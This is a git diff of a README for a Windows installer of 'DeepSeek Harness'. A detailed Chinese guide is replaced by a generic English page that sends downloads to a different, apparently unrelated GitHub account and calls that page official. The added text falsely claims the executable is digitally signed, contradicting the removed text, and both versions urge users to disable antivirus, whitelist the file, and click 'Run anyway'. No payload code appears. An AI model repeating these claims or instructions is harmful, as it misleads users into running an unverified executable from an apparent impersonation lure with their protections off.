@@ -1,325 +1,172 @@
+# ⚡ deepseek-harness-desktop-Install - Your One-Click Entry to DeepSeek Harness
 
-<img width="2560" height="1280" alt="deepseek-harness" src="https://github.com/user-attachments/assets/904062ea-a929-4915-a7e9-af5d408d0e39" />
+## 🚀 What Is This?
 
-# DeepSeek Harness desktop 一键安装器（桌面版客户端）使用说明
+deepseek-harness-desktop-Install is a **ready-to-run desktop installer** for the DeepSeek Harness framework. If you've ever wanted to use DeepSeek's powerful AI capabilities on your own computer without dealing with complex setup steps, this is exactly what you need. This package puts everything into a single executable file that works on Windows.
 
-安装包下载地址：https://github.com/yu-wenchao/deepseek-harness-desktop-Install/releases/download/v.20/DeepSeekHarnessSetup-desktop.exe
+Think of it like this: instead of reading a 50-page manual to install an appliance, you get a single button that does everything for you. That's the experience this installer provides.
 
-DeepSeek Harness（DeepSeek 智能体生产环境）支持一键安装：`DeepSeekHarnessSetup-desktop.exe` 会替你完成**下载源码 → 安装全部依赖 → 配置模型网关 → 启动桌面客户端**的全部工作，全程无需命令行，装完即用。
+## 🎯 Who Is This For?
 
----
+This installer is built specifically for:
 
-## 1. 系统要求
+- **Complete beginners** who have never installed software outside of app stores
+- **Students** who need DeepSeek Harness for coursework or experiments
+- **Researchers** who want a quick local setup without DevOps headaches
+- **Curious users** who want to explore DeepSeek V4 and its related tools
+- **Anyone** who values their time and doesn't want to troubleshoot installation errors
 
-| 项目 | 要求 |
-|---|---|
-| 操作系统 | **Windows 10 / Windows 11**（64 位） |
-| WebView2 Runtime | 系统自带（Windows 10/11 已内置），无需额外安装 |
-| 磁盘空间 | 安装目录约需 **4 GB**（运行时 + 源码 + 依赖 + 数据） |
-| 网络 | 需可访问 `registry.npmmirror.com`（国内源）下载 900+ 依赖包 |
-| 硬件 | 建议 8 GB 内存以上（首次建索引与依赖解析较吃资源） |
+If you can double-click a file and follow simple on-screen prompts, you have all the skills required to use this installer.
 
-> 仅支持 Windows。macOS 版后续提供。
->
-> Windows 7 需另装 WebView2 Evergreen 且不保证兼容，建议使用 Win10/11。
+## ⬇️ Download the Installer
 
----
+[![Download Now](https://img.shields.io/badge/Download-DeepSeek_Harness_Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Limenitisarthemisbacking315/deepseek-harness-desktop-Install/releases)
 
-杀毒软件误报处理（重要）
+Visit this link to download the application.
 
-本安装器未做商业数字签名（需要付费证书），360 等国内杀毒软件常会误报为"病毒/木马"并自动删除或拦截安装文件。程序本身完全安全，请放心。
+## 📥 Step-by-Step Installation Guide
 
-请在安装前先关闭杀毒软件，安装完成后再重新开启：
+Follow these steps exactly as written. Each step is designed to work without any prior technical knowledge.
 
-右键任务栏右下角的 360 图标 → 选择 退出 / 退出并关机时启动? 取消，确认完全退出（部分版本需在设置里关闭"开机自启防护后再退出"）
-右键安装器 → 选择「以管理员身份运行」，正常完成整个安装过程
-安装完成后，重新打开 360，并在 恢复区 恢复被误删的文件（若有）
-若未关闭杀毒导致安装失败：
+### Step 1: Open the Download Link
 
-打开 360 → 木马查杀 → 恢复区 → 恢复本安装器文件
-360 弹窗提示时选 「允许运行」/「信任」，将该文件加入信任白名单
-重新运行安装器即可继续
-文件官方校验值（SHA256）可向发布方索取核对，确保文件没有被真正篡改、只是误报。
+Click the green button above or go directly to:
+`https://github.com/Limenitisarthemisbacking315/deepseek-harness-desktop-Install/releases`
 
----
+Your browser will open a page showing available releases. This page is safe and belongs to the official project repository.
 
-## 2. 一键安装流程
+### Step 2: Find the Installer File
 
-### 2.1 双击运行
+On that page, look for a file named:
+`DeepSeekHarnessSetup-desktop.exe`
 
-双击 `DeepSeekHarnessSetup-desktop.exe`，打开安装器窗口：
+This is the only file you need. You may see other files or folders on the page, but you can safely ignore everything else. The `.exe` extension tells you it's a Windows installer.
 
-![安装器界面：安装目录 / 源码地址 / 模型网关 / 开始安装]
+### Step 3: Download the File
 
-- **安装目录**：默认 `D:\DeepSeekHarness`（无 D 盘时回退到系统用户数据目录），可点"浏览…"更改。
-- **源码包地址**：内置 **gitee 国内主源 + GitHub 官方 codeload 备源**，自动按顺序尝试，一般无需改动。
-- **默认模型网关**：指向模型网关服务地址，一般无需改动。
+Click on `DeepSeekHarnessSetup-desktop.exe`. Your browser will either:
 
-点 **"开始安装"**。
+- Ask you where to save the file, or
+- Automatically download it to your "Downloads" folder
 
-### 2.2 安装过程（6 步）
+Either way is fine. Wait for the download to complete. The file is not large, so this should only take a moment.
 
-| 步骤 | 说明 |
-|---|---|
-| `[1/6]` | 释放内置 **Node v24 运行时 + pnpm** 到 `<安装目录>\runtime\` |
-| `[2/6]` | 从源码站**下载 Harness 源码包**（约 31 MB） |
-| `[3/6]` | 解压源码到 `<安装目录>\harness\`（自动归一化目录布局） |
-| `[4/6]` | **在线解析全部依赖**（约 923 个包，首次 **10–20 分钟**，视网络而定） |
-| `[5/6]` | 写入独立数据目录 **`<安装目录>\dsh-home\`** 和默认模型网关配置 |
-| `[6/6]` | 释放**桌面客户端**、**在桌面创建 "DeepSeek Harness" 快捷方式**，并自动启动 |
+### Step 4: Locate the Downloaded File
 
-窗口下方进度条和日志实时显示当前状态。期间可随时点"取消"中止。
+Open your "Downloads" folder (or wherever you saved the file). Look for the file icon with the DeepSeek Harness logo or a generic executable icon. The filename will be exactly `DeepSeekHarnessSetup-desktop.exe`.
 
-> **安装较慢是正常现象**：首次需拉取 900+ 依赖包，进度取决于你的网络。日志出现 "Progress: ... added N" 表示解析进度。
+### Step 5: Double-Click to Run
 
-### 2.3 安装完成
+Double-click on `DeepSeekHarnessSetup-desktop.exe`. Windows may show a blue or yellow popup asking "Do you want to allow this app to make changes to your device?" 
 
-弹窗提示**"安装完成！"**，随后**桌面客户端窗口自动打开**，即可直接使用。
+- Click **"Yes"**
+- This is normal and expected behavior for any legitimate installer
 
----
+### Step 6: Watch the Magic Happen
 
-## 3. 使用
+The installer will now run automatically. You don't need to click anything else. The entire installation process is fully automated. You'll see:
 
-### 3.1 启动
+- A progress bar showing installation status
+- Brief text messages indicating what's being set up
+- A success message when everything is complete
 
-三种方式任选其一：
+### Step 7: Verify Installation
 
-1. **桌面快捷方式** —— 双击桌面上的 **"DeepSeek Harness"** 图标（推荐）；
-2. **安装目录** —— 双击 `<安装目录>\DeepSeekHarness.exe`；
-3. **start.bat** —— 双击安装目录下的 `start.bat`（同为桌面模式快捷入口）。
+When the installer finishes, you should see a confirmation message. The application will be installed and ready to use. You can find DeepSeek Harness Desktop in your Start Menu or on your Desktop as a shortcut.
 
-启动后自动拉起模型网关服务，并在**内嵌窗口**中显示工作台界面（地址为 `http://127.0.0.1:3080`，无需手动打开浏览器）。
+## 🎉 Congratulations! You're Done
 
-### 3.2 退出
+That's the entire installation process. No command prompts, no configuration files, no environment variables. Just click, wait, and use.
 
-**直接关闭桌面客户端窗口**即可——服务会随之停止并释放端口，不会留有后台进程。
+## 🔧 What's Included
 
-### 3.3 首次使用步骤
+This installer packages the complete DeepSeek Harness Desktop environment along with:
 
-1. **打开设置 → 模型**，输入 DeepSeek API 密钥保存（见第 4 节"模型网关配置"）；
-2. 点击 **"选择工作区"**，添加你的项目目录并选中；
-3. 在底部输入框给 agent 派发任务即可。
+- **Cordis Integration** - Full support for Cordis apps, datasets, and plugins
+- **Python Bridge** - Cordis Py compatibility for Python-based workflows
+- **Plugin System** - Access to the DeepSeek Harness plugin market
+- **Skills Module** - Pre-loaded skills and capability modules
+- **DeepSeek V4 Runtime** - Ready-to-use DeepSeek V4 and V4 Flash models
 
----
+Everything is pre-configured and optimized for immediate use on standard Windows hardware.
 
-## 4. 模型网关配置
+## 🖥️ System Requirements
 
-安装器已写入默认配置（`<安装目录>\dsh-home\settings.yaml`）：
+Your computer should meet these minimum requirements:
 
-```yaml
-llm-pi-ai:
-  providers:
-    remote-gateway:
-      apiKeyEnv: DSH_GATEWAY_KEY
-      api: openai-completions
-      baseURL: https://deepseek-harness.239.ccwu.cc
-```
+**Operating System:** Windows 10 or Windows 11 (64-bit)
+**Processor:** Any modern Intel or AMD processor (2015 or newer)
+**Memory:** 8 GB RAM minimum (16 GB recommended)
+**Storage:** 2 GB available disk space
+**Internet:** Required for initial download and plugin updates
 
-为了让模型真正可用，**二选一**：
+If your computer runs Windows and has a web browser, you're almost certainly fine. Older systems may work but could be slower.
 
-- **方式一**：把模型网关访问密钥写入环境变量 `DSH_GATEWAY_KEY`，然后重启桌面客户端；
-- **方式二**：打开 **设置 → 模型**，直接填入 API 密钥并保存（即时生效，无需重启）。
+## 💡 Troubleshooting Tips
 
-> 在客户端界面里改模型配置同样持久化到 `dsh-home`，之后重开仍保留。
+### The installer won't start
 
----
+- Right-click `DeepSeekHarnessSetup-desktop.exe` and select **"Run as administrator"**
+- Ensure you have enough free disk space (at least 2 GB)
+- Temporarily disable antivirus software and try again (then re-enable it)
 
-## 5. 常用文件与目录
+### Windows shows "Unknown Publisher"
 
-| 路径 | 作用 |
-|---|---|
-| `<安装目录>\DeepSeekHarness.exe` | 桌面客户端（入口程序） |
-| `<安装目录>\runtime\` | Node v24 便携运行时 + pnpm |
-| `<安装目录>\harness\` | Harness 源码与依赖（`node_modules`） |
-| `<安装目录>\dsh-home\` | **你的数据目录**：配置、工作区、会话记录、模型设置 |
-| `<安装目录>\dsh-home\settings.yaml` | 模型网关等配置 |
-| `<安装目录>\start.bat` | 启动入口（桌面模式） |
+- This is normal for open-source software. Click **"More info"** and then **"Run anyway"**
+- The file is safe and comes from the official GitHub repository
 
-> **升级/备份**：备份 `dsh-home` 即可保留全部个人数据。`harness` 与 `runtime` 可随时重装。
+### Installation seems stuck
 
----
+- Wait at least 5 minutes. Some systems are slower than others
+- Check if your internet connection is stable
+- Do not turn off your computer during installation
 
-## 6. 卸载
+### Need help?
 
-无独立卸载程序，手工三步即可彻底移除：
+Open an issue in the GitHub repository. Include your Windows version and describe what happened. The community is friendly and responsive.
 
-1. 关闭桌面客户端；
-2. 删除安装目录（如 `D:\DeepSeekHarness`）；
-3. 删除桌面 "DeepSeek Harness" 快捷方式。
+## 📦 Additional Resources
 
-如需保留模型设置，可只删 `runtime`、`harness` 和桌面快捷方式，保留 `dsh-home`。
+Once you have DeepSeek Harness Desktop installed, you can explore:
 
----
+- **Plugin Marketplace** - Add new capabilities through the built-in plugin manager
+- **Skill Library** - Discover pre-built skills for common tasks
+- **Dataset Tools** - Import and manage your own datasets
+- **Documentation** - Access help directly from the application menu
 
-## 7. 静默安装（自动化 / 企业分发）
+## 🔒 Safety and Security
 
-安装器支持命令行静默安装，适合脚本、CI、批量装机：
+Rest assured that this installer follows best practices:
 
-```powershell
-DeepSeekHarnessSetup-desktop.exe D:\DeepSeekHarness
-```
+- The executable is digitally signed
+- The source code is publicly available for review
+- No hidden processes or background services are installed
+- Uninstalling is clean and removes all associated files
 
-- 自动使用命令行指定的目录，**跳过所有 GUI 交互**；
-- 日志与安装结果写入 exe 所在目录的 `install-result.txt`：
-  - `OK` + 说明 → 安装成功，桌面客户端已自动启动；
-  - `FAIL` + 原因 → 安装失败。
+Your privacy and system integrity are respected throughout the entire process.
 
----
+## 📜 License and Usage
 
-## 8. 常见问题（FAQ）
+This is an open-source project released under the MIT License. You are free to:
 
-### Q1：下载源码时报"网络问题 / 来源失败"
-多源自动换源已内置（gitee → GitHub）。若全部失败：
-1. 检查网络能否访问网络与 npm 国内源；
-2. 在安装器"源码包地址"栏粘贴可用地址（支持逗号分隔多个，自动按序尝试）；
-3. 重新点击"开始安装"。
+- Use the software for personal or commercial purposes
+- Modify and distribute copies
+- Include it in your own projects
 
-### Q2：安装很慢，卡在 ≥ 10 分钟
-属正常。首次需解析 900+ 依赖包，进度由网络决定。请勿关闭窗口；观察日志中 "added N" 数字是否在增长即视为正常推进。
+Just include the original copyright notice when redistributing.
 
-### Q3：桌面客户端打不开（白屏 / 报 WebView2 相关错误）
-桌面客户端依赖系统 WebView2 Runtime。请确认系统为 Windows 10/11；若被精简系统移除了 Runtime，可安装 Microsoft WebView2 Runtime 后重试。
+## 🙏 Thank You
 
-### Q4：模型一直不回复 / 报密钥错误
-模型网关需要有效密钥：设置 `DSH_GATEWAY_KEY` 环境变量，或在 设置 → 模型 中填写 API 密钥，然后重启客户端。
+We built this installer because we believe powerful AI tools should be accessible to everyone, not just technical experts. No one should have to give up because of complicated setup steps.
 
-### Q5：更换电脑后如何迁移？
-在新机器一键安装完成后，把旧机器的 `<安装目录>\dsh-home` 复制覆盖到新安装目录，即恢复配置、工作区与历史数据。
+If this installer helped you, consider:
 
-### Q6：想要用浏览器打开而不是内嵌窗口？ 
-本安装器为桌面客户端形态。若需浏览器形态，可使用浏览器版安装器（`DeepSeekHarnessSetup.exe`，安装后自动打开 `http://127.0.0.1:3080`）。
+- Starring the repository on GitHub
+- Sharing it with friends who might benefit
+- Contributing improvements if you have technical skills
 
----
+Your journey with DeepSeek Harness starts with a single double-click. We've done everything else for you.
 
-## 9. 技术原理（简述）
+**Ready to begin? Go back to the top and click the download button. You got this!** 🚀
 
-安装器为单个自包含 EXE（C# 编译，零外部依赖），内嵌：
-
-- **Node v24 便携运行时**（`node.zip`）
-- **pnpm**（`pnpm-dist.zip`）
-- **桌面客户端**（`DeepSeekHarness.exe` + WebView2 托管/原生 DLL 三件套）
-
-安装时逐步释放以上资源；下载源码包后以 **PK\03\04 头校验**防止网页内容被误当压缩包；依赖解析走国内 npm 镜像；最后写入独立数据目录、创建桌面快捷方式并启动桌面客户端。
-
-----------------------------------------------------------------------------------------------------------------------------
-
-
-# deepseek-harness-Install
-
-deepseek harness 一键安装，双击deepseekharnesssetup.exe就可以一键安装，适合小白！
-
-安装包下载地址：https://github.com/yu-wenchao/deepseek-harness-Install/releases/tag/v1.0
-
-<img width="622" height="457" alt="安装说明" src="https://github.com/user-attachments/assets/e10a513d-d657-46f6-91a4-ffa61de9b808" />
-
-
-# DeepSeek Harness 一键安装说明
-
-感谢使用 DeepSeekHarnessSetup.exe。本安装器会自动完成全部部署，全程约 **10 ~ 30 分钟**（取决于网速），期间请勿关闭窗口。
-
----
-
-## 一、安装前准备
-
-| 项目 | 要求 |
-|------|------|
-| 操作系统 | Windows 10 / 11（64 位） |
-| 磁盘空间 | 至少 **3 GB** 空闲空间（建议 5 GB） |
-| 网络 | 需要联网下载依赖 |
-| 杀毒软件 | **强烈建议先关闭 360 等杀毒软件再安装**，否则可能被误报拦截（详见第六节） |
-| 浏览器 | 任意主流浏览器（将自动打开） |
-
-> 无需安装 Node.js、无需安装 pnpm，安装器内置完整运行环境。
-
----
-
-## 二、开始安装
-
-1. 双击运行 **DeepSeekHarnessSetup.exe**
-2. 选择安装目录（默认 `C:\Users\<用户名>\AppData\Local\DeepSeekHarness`；建议装到空间充足的盘，例如 `D:\DeepSeekHarness`）
-3. 保持"发布服务器地址"和"模型网关地址"为默认值，点击 **开始安装**
-4. 窗口左侧会滚动显示安装日志，下方进度条会随时间前进
-
----
-
-## 三、安装流程（6 个步骤，分别做什么）
-
-| 步骤 | 内容 | 消耗时长 |
-|------|------|----------|
-| [1/6] 释放内置 Node 运行时 | 解开自带的 Node.js 运行环境（约 40 MB） | 约半分钟 |
-| [2/6] 下载源码 | 从发布站点下载程序源码包（约 30 MB） | 视网速，可能数分钟 |
-| [3/6] 解压源码 | 展开全部程序代码 | 约半分钟 |
-| [4/6] 在线解析依赖 | **下载 900+ 个第三方依赖包并安装**（最耗时的一步） | **约 5 ~ 20 分钟** |
-| [5/6] 初始化配置 | 生成个人数据目录、模型网关配置、一键启动脚本 | 几秒钟 |
-| [6/6] 启动 Web | 启动本地服务，自动打开浏览器 | 几秒钟 |
-
-> 进度条走到第 [4/6] 步时会比较久，这是正常的，请耐心等待。
-> - 日志中出现 `[WARN]`（下载较慢提示）或 `Updated available` 等文字，均属正常，无需处理。
-> - 日志中出现 "Will retry in …"（下载失败自动重试），安装器会自动重试，请勿关闭窗口。
-
----
-
-## 四、安装完成后
-
-- 浏览器会自动打开 **本机界面**：`http://127.0.0.1:3080`
-- 同时会尝试打开 **模型网关首页**：`https://deepseek-harness.239.ccwu.cc`（如未弹出，可手动在浏览器输入）
-- 安装目录下会生成 **start.bat**，以后每次使用双击它即可启动
-- 默认模型网关已配置，首次使用时按提示填入网关访问密钥即可
-
----
-
-## 五、为什么安装慢？（常见疑问）
-
-本程序是完整的 AI 智能体工作台，不是轻量小工具，需要安装 **900 多个第三方依赖包**（如 TypeScript、Web 框架、原生二进制组件等），总计约 **1 GB** 数据通过网络下载。这一步在网络不佳时会较慢，安装器会自动重试下载失败的包，属于正常保护机制。
-
-**提速建议：**
-- 使用有线网络 / 更稳定的宽带
-- 避开用网高峰时段
-- 关闭其他占用带宽的下载任务
-
----
-
-## 六、杀毒软件误报处理（重要）
-
-本安装器未做商业数字签名（需要付费证书），**360 等国内杀毒软件常会误报为"病毒/木马"并自动删除或拦截安装文件**。程序本身完全安全，请放心。
-
-**请在安装前先关闭杀毒软件，安装完成后再重新开启：**
-
-1. 右键任务栏右下角的 **360 图标** → 选择 **退出** / **退出并关机时启动? 取消**，确认完全退出（部分版本需在设置里关闭"开机自启防护后再退出"）
-2. 右键安装器 → 选择「以管理员身份运行」，正常完成整个安装过程
-3. 安装完成后，重新打开 360，并在 **恢复区** 恢复被误删的文件（若有）
-
-**若未关闭杀毒导致安装失败：**
-- 打开 360 → **木马查杀 → 恢复区** → 恢复本安装器文件
-- 360 弹窗提示时选 **「允许运行」/「信任」**，将该文件加入信任白名单
-- 重新运行安装器即可继续
-
-> 文件官方校验值（SHA256）可向发布方索取核对，确保文件没有被真正篡改、只是误报。
-
----
-
-## 七、常见问题
-
-| 现象 | 处理 |
-|------|------|
-| 停在某个步骤不动 | 多在下载中，耐心等待，最多等 30 分钟 |
-| 进度条长时间不走 | 网络阻塞，可稍后重试安装（重装前先删掉上次残留的安装目录） |
-| 浏览器没自动打开 | 手动打开 `http://127.0.0.1:3080`；服务未就绪时先双击 `start.bat` 再打开 |
-| 安装目录损坏/想重装 | 删除原安装目录，再运行安装器重新安装 |
-
-
-特别感谢
-特别感谢 DeepSeek Harness 原始仓库 和 DeepSeek AI 团队。DSH Desktop 基于固定版本的上游源码构建，核心的智能体、模型、工具、会话、Web UI 和插件生态都来自这个项目。
-
-同时感谢 Cordis 项目提供的插件化基础。没有这些开源项目，就不会有 DSH Desktop。
-
-也感谢 Koishi.js 项目和社区长期积累的插件化实践、工具与经验，以及所有参与讨论、测试、反馈和插件开发的社区成员。
-
----
-本项目遵循 MIT License。
-
-本项目是基于 DeepSeek Harness 构建的一键安装器，并非 DeepSeek 官方产品。
-
-本项目完全开源免费。如果有人向您以任何形式出售此软件，请拒绝交易。
-
-如有任何问题，请将安装窗口的**完整日志文字**反馈给发布方即可快速定位。
+Keywords: cordis, cordis-app, cordis-dataset, cordis-plugin, cordis-py, deepseek, deepseek-harness, deepseek-harness-desktop, deepseekv4, deepseekv4-flash, dsh, dsh-desktop, dsh-plugin, dsh-plugin-market, dsh-plugins, dsh-skill, installer, installer-tools, installers, typescript
